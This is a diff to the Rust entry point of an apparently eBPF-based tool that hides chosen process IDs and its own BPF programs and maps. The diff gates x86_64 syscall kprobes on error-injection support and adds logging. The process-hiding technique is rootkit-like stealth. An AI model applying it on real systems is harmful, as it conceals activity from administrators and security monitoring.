@@ -47,42 +47,55 @@ async fn main() -> anyhow::Result<()> {
         SyscallTracepoint::from(("chdir_enter", "sys_enter_chdir")),
         SyscallTracepoint::from(("openat_enter", "sys_enter_openat")),
     ];
-    let kprobes = vec![
-        Kprobe::from(("x64_sys_kill_exit", "__x64_sys_kill")),
-        Kprobe::from(("x64_sys_kill_enter", "__x64_sys_kill")),
-        Kprobe::from(("x64_sys_getpgid_enter", "__x64_sys_getpgid")),
-        Kprobe::from(("x64_sys_getpgid_exit", "__x64_sys_getpgid")),
-        Kprobe::from(("x64_sys_getsid_enter", "__x64_sys_getsid")),
-        Kprobe::from(("x64_sys_getsid_exit", "__x64_sys_getsid")),
-        Kprobe::from(("x64_sys_getpriority_enter", "__x64_sys_getpriority")),
-        Kprobe::from(("x64_sys_getpriority_exit", "__x64_sys_getpriority")),
-        Kprobe::from(("x64_sys_sched_getparam_enter", "__x64_sys_sched_getparam")),
-        Kprobe::from(("x64_sys_sched_getparam_exit", "__x64_sys_sched_getparam")),
-        Kprobe::from((
-            "x64_sys_sched_getscheduler_enter",
-            "__x64_sys_sched_getscheduler",
-        )),
-        Kprobe::from((
-            "x64_sys_sched_getscheduler_exit",
-            "__x64_sys_sched_getscheduler",
-        )),
-        Kprobe::from((
-            "x64_sys_sched_rr_get_interval_exit",
-            "__x64_sys_sched_rr_get_interval",
-        )),
-        Kprobe::from((
-            "x64_sys_sched_rr_get_interval_enter",
-            "__x64_sys_sched_rr_get_interval",
-        )),
-        Kprobe::from((
-            "x64_sys_sched_getaffinity_enter",
-            "__x64_sys_sched_getaffinity",
-        )),
-        Kprobe::from((
-            "x64_sys_sched_getaffinity_exit",
-            "__x64_sys_sched_getaffinity",
-        )),
-    ];
+
+    #[cfg(not(target_arch = "x86_64"))]
+    let kprobes = vec![];
+
+    #[cfg(target_arch = "x86_64")]
+    let kprobes = {
+        use caracal::utils::is_function_error_injection_supported;
+
+        match is_function_error_injection_supported() {
+            Ok(true) => vec![
+                Kprobe::from(("x64_sys_kill_exit", "__x64_sys_kill")),
+                Kprobe::from(("x64_sys_kill_enter", "__x64_sys_kill")),
+                Kprobe::from(("x64_sys_getpgid_enter", "__x64_sys_getpgid")),
+                Kprobe::from(("x64_sys_getpgid_exit", "__x64_sys_getpgid")),
+                Kprobe::from(("x64_sys_getsid_enter", "__x64_sys_getsid")),
+                Kprobe::from(("x64_sys_getsid_exit", "__x64_sys_getsid")),
+                Kprobe::from(("x64_sys_getpriority_enter", "__x64_sys_getpriority")),
+                Kprobe::from(("x64_sys_getpriority_exit", "__x64_sys_getpriority")),
+                Kprobe::from(("x64_sys_sched_getparam_enter", "__x64_sys_sched_getparam")),
+                Kprobe::from(("x64_sys_sched_getparam_exit", "__x64_sys_sched_getparam")),
+                Kprobe::from((
+                    "x64_sys_sched_getscheduler_enter",
+                    "__x64_sys_sched_getscheduler",
+                )),
+                Kprobe::from((
+                    "x64_sys_sched_getscheduler_exit",
+                    "__x64_sys_sched_getscheduler",
+                )),
+                Kprobe::from((
+                    "x64_sys_sched_rr_get_interval_exit",
+                    "__x64_sys_sched_rr_get_interval",
+                )),
+                Kprobe::from((
+                    "x64_sys_sched_rr_get_interval_enter",
+                    "__x64_sys_sched_rr_get_interval",
+                )),
+                Kprobe::from((
+                    "x64_sys_sched_getaffinity_enter",
+                    "__x64_sys_sched_getaffinity",
+                )),
+                Kprobe::from((
+                    "x64_sys_sched_getaffinity_exit",
+                    "__x64_sys_sched_getaffinity",
+                )),
+            ],
+            _ => vec![],
+        }
+    };
+
     //let kprobes = vec![];
     let mut ebpf = EbpfLoader::new().load(aya::include_bytes_aligned!(
         "../../target/bpfel-unknown-none/release/caracal"
@@ -132,13 +145,14 @@ async fn main() -> anyhow::Result<()> {
         HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();
     let prog_ids = full_bpf_info.prog_ids;
     let map_ids = full_bpf_info.map_ids;
-
+    info!("=========== eBPF RESSOURCES ===========");
     for p in prog_ids.clone() {
         info!("bpf prog: {p} -> hide")
     }
     for m in map_ids.clone() {
         info!("bpf  map: {m} -> hide")
     }
+    info!("");
 
     // keep skip-maps updated
     let _ = thread::Builder::new()
@@ -223,7 +237,7 @@ async fn main() -> anyhow::Result<()> {
             // setup pid/thread trees to hide
             let mut sys = System::new_all();
             let _ = sys.refresh_processes(ProcessesToUpdate::All, true);
-
+            info!("=========== PIDs RESSOURCES ===========");
             for p in pid.iter() {
                 info!("pid: {p} -> hide");
                 hidden_pids_map
@@ -246,6 +260,7 @@ async fn main() -> anyhow::Result<()> {
                         });
                 }
             }
+            info!("");
         });
     let ctrl_c = signal::ctrl_c();
     ctrl_c.await?;
